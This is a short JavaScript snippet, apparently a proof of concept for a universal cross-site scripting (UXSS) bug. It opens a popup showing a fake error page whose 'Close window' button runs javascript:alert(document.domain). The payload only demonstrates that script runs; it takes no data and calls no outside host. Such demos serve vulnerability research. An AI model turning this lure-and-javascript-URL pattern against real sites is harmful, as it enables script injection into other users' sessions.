(() => {
  if (sessionStorage.getItem('payloadDone')) return;
  sessionStorage.setItem('payloadDone', '1');

  const newWindow = window.open('about:blank', '_blank');
  if (!newWindow) {
    console.error('Popup bloqueado');
    return;
  }

  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>UXSS</title>
      <style>
        body { font-family: sans-serif; padding: 20px; }
        button { padding: 10px 20px; font-size: 16px; }
      </style>
    </head>
    <body>
      <h1>An error occurred!</h1>
      <button onclick="window.location.href='javascript:alert(document.domain)'">Close window</button>
    </body>
    </html>
  `;

  newWindow.document.write(html);
  newWindow.document.close();
})();
